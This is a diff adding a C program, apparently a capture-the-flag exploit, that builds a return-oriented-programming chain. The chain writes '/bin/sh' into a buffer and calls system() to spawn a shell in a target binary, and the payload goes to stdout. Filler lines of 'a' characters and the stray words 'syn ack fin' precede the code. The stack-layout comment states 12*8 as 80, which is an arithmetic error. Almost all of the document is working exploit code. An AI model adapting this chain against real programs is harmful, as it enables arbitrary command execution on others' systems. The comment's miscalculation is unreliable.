@@ -1,0 +1,47 @@
+<pre>
+aaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+syn ack fin
+
+#include <unistd.h>
+#include <string.h>
+
+void main()
+{
+	/*
+	* == payload (12*8=80=0x60バイト)
+	* | 0x00 | 0x0000000000000000 |                | 0x0000000000000000 |
+	* | 0x10 | 0x0000000000000000 |                | 0x0000000000000000 |
+	* | 0x20 | 0x0000000000000000 |                | 0x0000000000400890 | pop r14 > pop r15
+	* | 0x30 | 0x0000000000601000 | buffer         | /bin/sh\0          | str
+	* | 0x40 | 0x0000000000400820 | mov [r14], r15 | 0x0000000000400893 | pop rdi
+	* | 0x50 | 0x0000000000601000 | buffer         | 0x0000000000400810 | system()
+	*/
+
+	long buffer = 0x601000L;
+	long pop_rdi = 0x400893L;
+	long pop_r14_r15 = 0x400890L;
+	long mov_r14_r15 = 0x400820L;
+	long call_system = 0x400810L;
+	long command = 0x68732f6e69622f;
+
+	long payload[12] = {
+		[4] = 0x0L,
+		pop_r14_r15,
+		buffer,
+		command,
+		mov_r14_r15,
+		pop_rdi,
+		buffer,
+		call_system,
+	};
+
+	write(1, payload, 0x60);
+	write(1, "\n", 0x1);
+}
+
+</pre>
